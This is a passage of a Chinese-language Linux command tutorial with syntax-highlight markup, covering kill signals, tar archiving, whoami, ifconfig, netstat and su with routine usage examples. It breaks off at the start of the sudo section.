class="number">48</span>) SIGRTMIN+<span class="number">14</span> <span class="number">49</span>) SIGRTMIN+<span class="number">15</span> <span class="number">50</span>) SIGRTMAX<span class="number">-14</span></span><br><span class="line"><span class="number">51</span>) SIGRTMAX<span class="number">-13</span> <span class="number">52</span>) SIGRTMAX<span class="number">-12</span> <span class="number">53</span>) SIGRTMAX<span class="number">-11</span> <span class="number">54</span>) SIGRTMAX<span class="number">-10</span></span><br><span class="line"><span class="number">55</span>) SIGRTMAX<span class="number">-9</span>  <span class="number">56</span>) SIGRTMAX<span class="number">-8</span>  <span class="number">57</span>) SIGRTMAX<span class="number">-7</span>  <span class="number">58</span>) SIGRTMAX<span class="number">-6</span></span><br><span class="line"><span class="number">59</span>) SIGRTMAX<span class="number">-5</span>  <span class="number">60</span>) SIGRTMAX<span class="number">-4</span>  <span class="number">61</span>) SIGRTMAX<span class="number">-3</span>  <span class="number">62</span>) SIGRTMAX<span class="number">-2</span></span><br><span class="line"><span class="number">63</span>) SIGRTMAX<span class="number">-1</span>  <span class="number">64</span>) SIGRTMAX</span><br></pre></td></tr></table></figure>
<p>只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略，下面是常用的信号：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">HUP     <span class="number">1</span>    终端断线</span><br><span class="line">INT     <span class="number">2</span>    中断（同 Ctrl + C）</span><br><span class="line">QUIT    <span class="number">3</span>    退出（同 Ctrl + \）</span><br><span class="line">TERM   <span class="number">15</span>    终止</span><br><span class="line">KILL    <span class="number">9</span>    强制终止</span><br><span class="line">CONT   <span class="number">18</span>    继续（与STOP相反， fg/bg命令）</span><br><span class="line">STOP   <span class="number">19</span>    暂停（同 Ctrl + Z）</span><br></pre></td></tr></table></figure>
<p>先用ps查找进程，然后用kill杀掉：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ps -ef | grep vim</span><br><span class="line">root      <span class="number">3268</span>  <span class="number">2884</span>  <span class="number">0</span> <span class="number">16</span>:<span class="number">21</span> pts/<span class="number">1</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> vim install.log</span><br><span class="line">root      <span class="number">3370</span>  <span class="number">2822</span>  <span class="number">0</span> <span class="number">16</span>:<span class="number">21</span> pts/<span class="number">0</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> grep vim</span><br><span class="line"></span><br><span class="line">kill <span class="number">3268</span></span><br><span class="line">kill <span class="number">3268</span></span><br><span class="line">-bash: kill: (<span class="number">3268</span>) - 没有那个进程</span><br></pre></td></tr></table></figure>
<h2 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h2><p>tar命令可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。</p>
<p>首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。</p>
<p>为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p>
<h3 id="语法-15"><a href="#语法-15" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">tar</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-15"><a href="#选项-15" class="headerlink" title="选项"></a>选项</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-A或--catenate：新增文件到以存在的备份文件；</span></span><br><span class="line"><span class="deletion">-B：设置区块大小；</span></span><br><span class="line"><span class="deletion">-c或--create：建立新的备份文件；</span></span><br><span class="line"><span class="deletion">-C &lt;目录&gt;：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。</span></span><br><span class="line"><span class="deletion">-d：记录文件的差别；</span></span><br><span class="line"><span class="deletion">-x或--extract或--get：从备份文件中还原文件；</span></span><br><span class="line"><span class="deletion">-t或--list：列出备份文件的内容；</span></span><br><span class="line"><span class="deletion">-z或--gzip或--ungzip：通过gzip指令处理备份文件；</span></span><br><span class="line"><span class="deletion">-Z或--compress或--uncompress：通过compress指令处理备份文件；</span></span><br><span class="line"><span class="deletion">-f&lt;备份文件&gt;或--file=&lt;备份文件&gt;：指定备份文件；</span></span><br><span class="line"><span class="deletion">-v或--verbose：显示指令执行过程；</span></span><br><span class="line"><span class="deletion">-r：添加文件到已经压缩的文件；</span></span><br><span class="line"><span class="deletion">-u：添加改变了和现有的文件到已经存在的压缩文件；</span></span><br><span class="line"><span class="deletion">-j：支持bzip2解压文件；</span></span><br><span class="line"><span class="deletion">-v：显示操作过程；</span></span><br><span class="line"><span class="deletion">-l：文件系统边界设置；</span></span><br><span class="line"><span class="deletion">-k：保留原有文件不覆盖；</span></span><br><span class="line"><span class="deletion">-m：保留文件不被覆盖；</span></span><br><span class="line"><span class="deletion">-w：确认压缩文件的正确性；</span></span><br><span class="line"><span class="deletion">-p或--same-permissions：用原来的文件权限还原文件；</span></span><br><span class="line"><span class="deletion">-P或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；</span></span><br><span class="line"><span class="deletion">-N &lt;日期格式&gt; 或 --newer=&lt;日期时间&gt;：只将较指定日期更新的文件保存到备份文件里；</span></span><br><span class="line"><span class="deletion">--exclude=&lt;范本样式&gt;：排除符合范本样式的文件。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-12"><a href="#参数-12" class="headerlink" title="参数"></a>参数</h3><p>文件或目录：指定要打包的文件或目录列表。</p>
<h3 id="实例-13"><a href="#实例-13" class="headerlink" title="实例"></a>实例</h3><p>将文件全部打包成tar包：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-cvf</span> <span class="selector-tag">log</span><span class="selector-class">.tar</span> <span class="selector-tag">log2012</span><span class="selector-class">.log</span>    仅打包，不压缩！ </span><br><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-zcvf</span> <span class="selector-tag">log</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span> <span class="selector-tag">log2012</span><span class="selector-class">.log</span>   打包后，以 <span class="selector-tag">gzip</span> 压缩 </span><br><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-jcvf</span> <span class="selector-tag">log</span><span class="selector-class">.tar</span><span class="selector-class">.bz2</span> <span class="selector-tag">log2012</span><span class="selector-class">.log</span>  打包后，以 <span class="selector-tag">bzip2</span> 压缩</span><br></pre></td></tr></table></figure>
<p>在选项f之后的文件档名是自己取的，我们习惯上都用 .tar 来作为辨识。 如果加z选项，则以.tar.gz或.tgz来代表gzip压缩过的tar包；如果加j选项，则以.tar.bz2来作为tar包名。</p>
<p>查阅上述tar包内有哪些文件：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-ztvf</span> <span class="selector-tag">log</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure>
<p>由于我们使用 gzip 压缩的log.tar.gz，所以要查阅log.tar.gz包内的文件时，就得要加上z这个选项了。</p>
<p>将tar包解压缩：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tar -zxvf <span class="regexp">/opt/</span>soft<span class="regexp">/test/</span>log.tar.gz</span><br></pre></td></tr></table></figure>
<p>在预设的情况下，我们可以将压缩档在任何地方解开的</p>
<p>只将tar内的部分文件解压出来：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tar -zxvf <span class="regexp">/opt/</span>soft<span class="regexp">/test/</span>log30.tar.gz log2013.log</span><br></pre></td></tr></table></figure>
<p>我可以透过tar -ztvf来查阅 tar 包内的文件名称，如果单只要一个文件，就可以透过这个方式来解压部分文件！</p>
<p>文件备份下来，并且保存其权限：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">-zcvpf</span> <span class="selector-tag">log31</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span> <span class="selector-tag">log2014</span><span class="selector-class">.log</span> <span class="selector-tag">log2015</span><span class="selector-class">.log</span> <span class="selector-tag">log2016</span><span class="selector-class">.log</span></span><br></pre></td></tr></table></figure>
<p>这个-p的属性是很重要的，尤其是当您要保留原本文件的属性时。</p>
<p>在文件夹当中，比某个日期新的文件才备份：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">tar -N <span class="string">"2012/11/13"</span> -zcvf log17<span class="selector-class">.tar</span><span class="selector-class">.gz</span> test</span><br></pre></td></tr></table></figure>
<p>备份文件夹内容是排除部分文件：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">tar --exclude scf<span class="built_in">/service </span>-zcvf scf.tar.gz scf/*</span><br></pre></td></tr></table></figure>
<p>其实最简单的使用 tar 就只要记忆底下的方式即可：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">压  缩：tar -zcvf log<span class="selector-class">.tar</span><span class="selector-class">.gz</span> log2012<span class="selector-class">.log</span> </span><br><span class="line">解压缩：tar -zxvf /opt/soft/test/log<span class="selector-class">.tar</span>.gz</span><br><span class="line">压　缩：tar -jcv -f filename<span class="selector-class">.tar</span><span class="selector-class">.bz2</span> 要被压缩的文件或目录名称</span><br><span class="line">查　询：tar -jtv -f filename<span class="selector-class">.tar</span>.bz2</span><br><span class="line">解压缩：tar -jxv -f filename<span class="selector-class">.tar</span><span class="selector-class">.bz2</span> -C 欲解压缩的目录</span><br></pre></td></tr></table></figure>
<h2 id="whoami命令"><a href="#whoami命令" class="headerlink" title="whoami命令"></a>whoami命令</h2><p>whoami命令用于打印当前有效的用户名称，相当于执行id -un命令。</p>
<h3 id="语法-16"><a href="#语法-16" class="headerlink" title="语法"></a>语法</h3><p>whoami(选项)</p>
<h3 id="选项-16"><a href="#选项-16" class="headerlink" title="选项"></a>选项</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="comment">--help：在线帮助；</span></span><br><span class="line"><span class="comment">--version：显示版本信息。</span></span><br></pre></td></tr></table></figure>
<h3 id="实例-14"><a href="#实例-14" class="headerlink" title="实例"></a>实例</h3><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># whoami</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># id -un</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h2 id="ifconfig命令"><a href="#ifconfig命令" class="headerlink" title="ifconfig命令"></a>ifconfig命令</h2><p>ifconfig命令被用于配置和显示Linux内核中网络接口的网络参数。用ifconfig命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永远的存的电脑里，那就要修改网卡的配置文件了。</p>
<h3 id="语法-17"><a href="#语法-17" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">ifconfig</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<p>###参数</p>
<figure class="highlight bnf"><table><tr><td class="code"><pre><span class="line">add<span class="attribute">&lt;地址&gt;</span>：设置网络设备IPv6的ip地址；</span><br><span class="line">del<span class="attribute">&lt;地址&gt;</span>：删除网络设备IPv6的IP地址；</span><br><span class="line">down：关闭指定的网络设备；</span><br><span class="line"><span class="attribute">&lt;hw&lt;网络设备类型&gt;</span><span class="attribute">&lt;硬件地址&gt;</span>：设置网络设备的类型与硬件地址；</span><br><span class="line">io_addr<span class="attribute">&lt;I/O地址&gt;</span>：设置网络设备的I/O地址；</span><br><span class="line">irq<span class="attribute">&lt;IRQ地址&gt;</span>：设置网络设备的IRQ；</span><br><span class="line">media<span class="attribute">&lt;网络媒介类型&gt;</span>：设置网络设备的媒介类型；</span><br><span class="line">mem_start<span class="attribute">&lt;内存地址&gt;</span>：设置网络设备在主内存所占用的起始地址；</span><br><span class="line">metric<span class="attribute">&lt;数目&gt;</span>：指定在计算数据包的转送次数时，所要加上的数目；</span><br><span class="line">mtu<span class="attribute">&lt;字节&gt;</span>：设置网络设备的MTU；</span><br><span class="line">netmask<span class="attribute">&lt;子网掩码&gt;</span>：设置网络设备的子网掩码；</span><br><span class="line">tunnel<span class="attribute">&lt;地址&gt;</span>：建立IPv4与IPv6之间的隧道通信地址；</span><br><span class="line">up：启动指定的网络设备；</span><br><span class="line">-broadcast<span class="attribute">&lt;地址&gt;</span>：将要送往指定地址的数据包当成广播数据包来处理；</span><br><span class="line">-pointopoint<span class="attribute">&lt;地址&gt;</span>：与指定地址的网络设备建立直接连线，此模式具有保密功能；</span><br><span class="line">-promisc：关闭或启动指定网络设备的promiscuous模式；</span><br><span class="line">IP地址：指定网络设备的IP地址；</span><br><span class="line">网络设备：指定网络设备的名称。</span><br></pre></td></tr></table></figure>
<h3 id="实例-15"><a href="#实例-15" class="headerlink" title="实例"></a>实例</h3><p>显示网络设备信息（激活状态的）：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost ~]# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr <span class="number">00</span>:<span class="number">16</span>:<span class="number">3</span>E:<span class="number">00</span>:<span class="number">1</span>E:<span class="number">51</span>  </span><br><span class="line">          inet addr:<span class="number">10.160</span><span class="number">.7</span><span class="number">.81</span>  Bcast:<span class="number">10.160</span><span class="number">.15</span><span class="number">.255</span>  Mask:<span class="number">255.255</span><span class="number">.240</span><span class="number">.0</span></span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">61430830</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">88534</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span></span><br><span class="line">          RX bytes:<span class="number">3607197869</span> (<span class="number">3.3</span> GiB)  TX bytes:<span class="number">6115042</span> (<span class="number">5.8</span> MiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  Mask:<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">          UP LOOPBACK RUNNING  MTU:<span class="number">16436</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">56103</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">56103</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">0</span></span><br><span class="line">          RX bytes:<span class="number">5079451</span> (<span class="number">4.8</span> MiB)  TX bytes:<span class="number">5079451</span> (<span class="number">4.8</span> MiB)</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<p>eth0表示第一块网卡，其中<code>HWaddr</code>表示网卡的物理地址，可以看到目前这个网卡的物理地址(MAC地址）是<code>00:16:3E:00:1E:51</code>。</p>
<p>inet addr用来表示网卡的IP地址，此网卡的IP地址是<code>10.160.7.81</code>，广播地址<code>Bcast:10.160.15.255</code>，掩码地址<code>Mask:255.255.240.0</code>。</p>
<p>lo是表示主机的回环地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。比如把 httpd服务器的指定到回环地址，在浏览器输入127.0.0.1就能看到你所架WEB网站了。但只是您能看得到，局域网的其它主机或用户无从知道。</p>
<ul>
<li>第一行：连接类型：Ethernet（以太网）HWaddr（硬件mac地址）。</li>
<li>第二行：网卡的IP地址、子网、掩码。</li>
<li>第三行：UP（代表网卡开启状态）RUNNING（代表网卡的网线被接上）MULTICAST（支持组播）MTU:1500（最大传输单元）：1500字节。</li>
<li>第四、五行：接收、发送数据包情况统计。</li>
<li>第七行：接收、发送数据字节数统计信息。</li>
</ul>
<p>启动关闭指定网卡：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">ifconfig</span> <span class="string">eth0 up</span></span><br><span class="line"><span class="attr">ifconfig</span> <span class="string">eth0 down</span></span><br></pre></td></tr></table></figure>
<p><code>ifconfig eth0 up</code>为启动网卡eth0，<code>ifconfig eth0 down</code>为关闭网卡eth0。ssh登陆linux服务器操作要小心，关闭了就不能开启了，除非你有多网卡。</p>
<p>为网卡配置和删除IPv6地址：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 add <span class="number">33f</span>fe:<span class="number">3240</span>:<span class="number">800</span>:<span class="number">1005</span>::<span class="number">2</span>/<span class="number">64</span>    #为网卡eth0配置IPv6地址</span><br><span class="line">ifconfig eth0 del <span class="number">33f</span>fe:<span class="number">3240</span>:<span class="number">800</span>:<span class="number">1005</span>::<span class="number">2</span>/<span class="number">64</span>    #为网卡eth0删除IPv6地址</span><br></pre></td></tr></table></figure>
<p>用ifconfig修改MAC地址：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">ifconfig</span> <span class="selector-tag">eth0</span> <span class="selector-tag">hw</span> <span class="selector-tag">ether</span> 00<span class="selector-pseudo">:AA</span><span class="selector-pseudo">:BB</span><span class="selector-pseudo">:CC</span><span class="selector-pseudo">:dd</span><span class="selector-pseudo">:EE</span></span><br></pre></td></tr></table></figure>
<p>配置IP地址：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost ~]# ifconfig eth0 <span class="number">192.168</span><span class="number">.2</span><span class="number">.10</span></span><br><span class="line">[<span class="symbol">root@</span>localhost ~]# ifconfig eth0 <span class="number">192.168</span><span class="number">.2</span><span class="number">.10</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">[<span class="symbol">root@</span>localhost ~]# ifconfig eth0 <span class="number">192.168</span><span class="number">.2</span><span class="number">.10</span> netmask <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> broadcast <span class="number">192.168</span><span class="number">.2</span><span class="number">.255</span></span><br></pre></td></tr></table></figure>
<p>启用和关闭arp协议：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ifconfig</span> eth0 arp    <span class="comment">#开启网卡eth0 的arp协议</span></span><br><span class="line">ifconfig eth0 -arp   <span class="comment">#关闭网卡eth0 的arp协议</span></span><br></pre></td></tr></table></figure>
<p>设置最大传输单元：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 mtu <span class="number">1500</span>    #设置能通过的最大数据包大小为 <span class="number">1500</span> bytes</span><br></pre></td></tr></table></figure>
<h2 id="netstat命令"><a href="#netstat命令" class="headerlink" title="netstat命令"></a>netstat命令</h2><p>netstat命令用来打印Linux中网络系统的状态信息，可让你得知整个Linux系统的网络情况。</p>
<h3 id="语法-18"><a href="#语法-18" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">netstat</span><span class="params">(选项)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-17"><a href="#选项-17" class="headerlink" title="选项"></a>选项</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">-a或<span class="params">--all</span>：显示所有连线中的Socket；</span><br><span class="line">-A&lt;网络类型&gt;或--&lt;网络类型&gt;：列出该网络类型连线中的相关地址；</span><br><span class="line">-c或<span class="params">--continuous</span>：持续列出网络状态；</span><br><span class="line">-C或<span class="params">--cache</span>：显示路由器配置的快取信息；</span><br><span class="line">-e或<span class="params">--extend</span>：显示网络其他相关信息；</span><br><span class="line">-F或<span class="params">--fib</span>：显示FIB；</span><br><span class="line">-g或<span class="params">--groups</span>：显示多重广播功能群组组员名单；</span><br><span class="line">-h或<span class="params">--help</span>：在线帮助；</span><br><span class="line">-i或<span class="params">--interfaces</span>：显示网络界面信息表单；</span><br><span class="line">-l或<span class="params">--listening</span>：显示监控中的服务器的Socket；</span><br><span class="line">-M或<span class="params">--masquerade</span>：显示伪装的网络连线；</span><br><span class="line">-n或<span class="params">--numeric</span>：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">-N或<span class="params">--netlink</span>或<span class="params">--symbolic</span>：显示网络硬件外围设备的符号连接名称；</span><br><span class="line">-o或<span class="params">--timers</span>：显示计时器；</span><br><span class="line">-p或<span class="params">--programs</span>：显示正在使用Socket的程序识别码和程序名称；</span><br><span class="line">-r或<span class="params">--route</span>：显示Routing Table；</span><br><span class="line">-s或<span class="params">--statistice</span>：显示网络工作信息统计表；</span><br><span class="line">-t或<span class="params">--tcp</span>：显示TCP传输协议的连线状况；</span><br><span class="line">-u或<span class="params">--udp</span>：显示UDP传输协议的连线状况；</span><br><span class="line">-v或<span class="params">--verbose</span>：显示指令执行过程；</span><br><span class="line">-V或<span class="params">--version</span>：显示版本信息；</span><br><span class="line">-w或<span class="params">--raw</span>：显示RAW传输协议的连线状况；</span><br><span class="line">-x或<span class="params">--unix</span>：此参数的效果和指定<span class="string">"-A unix"</span>参数相同；</span><br><span class="line"><span class="params">--ip</span>或<span class="params">--inet</span>：此参数的效果和指定<span class="string">"-A inet"</span>参数相同。</span><br></pre></td></tr></table></figure>
<h3 id="实例-16"><a href="#实例-16" class="headerlink" title="实例"></a>实例</h3><p>列出所有端口 (包括监听和未监听的)</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">netstat -<span class="keyword">a</span>     <span class="comment">#列出所有端口</span></span><br><span class="line">netstat -<span class="keyword">at</span>    <span class="comment">#列出所有tcp端口</span></span><br><span class="line">netstat -au    <span class="comment">#列出所有udp端口</span></span><br></pre></td></tr></table></figure>

<p>列出所有处于监听状态的 Sockets</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">netstat -l        <span class="meta">#只显示监听端口</span></span><br><span class="line">netstat -<span class="keyword">lt</span>       <span class="meta">#只列出所有监听 tcp 端口</span></span><br><span class="line">netstat -<span class="built_in">lu</span>       <span class="meta">#只列出所有监听 udp 端口</span></span><br><span class="line">netstat -lx       <span class="meta">#只列出所有监听 UNIX 端口</span></span><br></pre></td></tr></table></figure>
<p>显示每个协议的统计信息</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">netstat</span> <span class="string">-s   显示所有端口的统计信息</span></span><br><span class="line"><span class="attr">netstat</span> <span class="string">-st   显示TCP端口的统计信息</span></span><br><span class="line"><span class="attr">netstat</span> <span class="string">-su   显示UDP端口的统计信息</span></span><br></pre></td></tr></table></figure>
<p>在netstat输出中显示 PID 和进程名称</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">netstat -pt</span></span><br></pre></td></tr></table></figure>
<p><code>netstat -p</code>可以与其它开关一起使用，就可以添加“PID/进程名称”到netstat输出中，这样debugging的时候可以很方便的发现特定端口运行的程序。</p>
<p>在netstat输出中不显示主机，端口和用户名(host, port or user)</p>
<p>当你不想让主机，端口和用户名显示，使用<code>netstat -n</code>。将会使用数字代替那些名称。同样可以加速输出，因为不用进行比对查询。</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">netstat -an</span></span><br></pre></td></tr></table></figure>
<p>如果只是不想让这三个名称中的一个被显示，使用以下命令:</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">netsat -<span class="keyword">a</span> <span class="comment">--numeric-ports</span></span><br><span class="line">netsat -<span class="keyword">a</span> <span class="comment">--numeric-hosts</span></span><br><span class="line">netsat -<span class="keyword">a</span> <span class="comment">--numeric-users</span></span><br></pre></td></tr></table></figure>
<p>持续输出netstat信息</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">netstat</span> -c   <span class="comment">#每隔一秒输出网络信息</span></span><br></pre></td></tr></table></figure>
<p>显示系统不支持的地址族(Address Families)</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">netstat <span class="comment">--verbose</span></span><br></pre></td></tr></table></figure>
<p>在输出的末尾，会有如下的信息：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">netstat:</span> <span class="literal">no</span> <span class="string">support</span> <span class="string">for</span> <span class="string">`AF</span> <span class="string">IPX'</span> <span class="string">on</span> <span class="string">this</span> <span class="string">system.</span></span><br><span class="line"><span class="attr">netstat:</span> <span class="literal">no</span> <span class="string">support</span> <span class="string">for</span> <span class="string">`AF</span> <span class="string">AX25'</span> <span class="string">on</span> <span class="string">this</span> <span class="string">system.</span></span><br><span class="line"><span class="attr">netstat:</span> <span class="literal">no</span> <span class="string">support</span> <span class="string">for</span> <span class="string">`AF</span> <span class="string">X25'</span> <span class="string">on</span> <span class="string">this</span> <span class="string">system.</span></span><br><span class="line"><span class="attr">netstat:</span> <span class="literal">no</span> <span class="string">support</span> <span class="string">for</span> <span class="string">`AF</span> <span class="string">NETROM'</span> <span class="string">on</span> <span class="string">this</span> <span class="string">system.</span></span><br></pre></td></tr></table></figure>
<p>显示核心路由信息</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">netstat -r</span></span><br></pre></td></tr></table></figure>
<p>使用<code>netstat -rn</code>显示数字格式，不查询主机名称。</p>
<p>找出程序运行的端口</p>
<p>并不是所有的进程都能找到，没有权限的会不显示，使用 root 权限查看所有的信息。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">netstat -ap <span class="string">| grep ssh</span></span><br></pre></td></tr></table></figure>
<p>找出运行在指定端口的进程：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">netstat -an | <span class="keyword">grep</span> <span class="string">':80'</span></span><br></pre></td></tr></table></figure>
<p>显示网络接口列表</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">netstat -i</span></span><br></pre></td></tr></table></figure>
<p>显示详细信息，像是ifconfig使用<code>netstat -ie</code>。</p>
<h2 id="su命令"><a href="#su命令" class="headerlink" title="su命令"></a>su命令</h2><p>su命令用于切换当前用户身份到其他用户身份，变更时须输入所要变更的用户帐号与密码。</p>
<h3 id="语法-19"><a href="#语法-19" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">su</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-18"><a href="#选项-18" class="headerlink" title="选项"></a>选项</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">-c&lt;指令&gt;或--command=&lt;指令&gt;：执行完指定的指令后，即恢复原来的身份；</span><br><span class="line">-f或——fast：适用于csh与tsch，使<span class="keyword">shell</span>不用去读取启动文件；</span><br><span class="line">-<span class="keyword">l</span>或——login：改变身份时，也同时变更工作目录，以及HOME,<span class="keyword">SHELL</span>,USER,logname。此外，也会变更PATH变量；</span><br><span class="line">-<span class="keyword">m</span>,-p或--<span class="keyword">preserve</span>-environment：变更身份时，不要变更环境变量；</span><br><span class="line">-s&lt;<span class="keyword">shell</span>&gt;或--<span class="keyword">shell</span>=&lt;<span class="keyword">shell</span>&gt;：指定要执行的<span class="keyword">shell</span>；</span><br><span class="line">--<span class="keyword">help</span>：显示帮助；</span><br><span class="line">--<span class="keyword">version</span>；显示版本信息。</span><br></pre></td></tr></table></figure>
<h3 id="参数-13"><a href="#参数-13" class="headerlink" title="参数"></a>参数</h3><p>用户：指定要切换身份的目标用户。</p>
<h3 id="实例-17"><a href="#实例-17" class="headerlink" title="实例"></a>实例</h3><p>变更帐号为root并在执行ls指令后退出变回原使用者：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">su</span> -c <span class="keyword">ls</span> root</span><br></pre></td></tr></table></figure>
<p>变更帐号为root并传入-f选项给新执行的shell：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">su root -f</span></span><br></pre></td></tr></table></figure>
<p>变更帐号为test并改变工作目录至test的家目录：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">su</span> -<span class="keyword">test</span></span><br></pre></td></tr></table></figure>
<h2 id="sudo命令"><a href="#sudo命令" class="headerlink" title="sudo命令"></a>sudo命令</h2><p>sudo命令用来以其他身份来执行命令，预设的身份为root。在<code>/etc/sudoers</code>中设置了可执行sudo指令的用户。若其未经授权的用户企图使用sudo，则会发出警告的邮件给管理员。用户使用sudo时，必须先输入密码，之后有5分钟的有效期限，超过期限则必须重新输入密码。</p>
<h3 id="语法-20"><a href="#语法-20" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">sudo</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
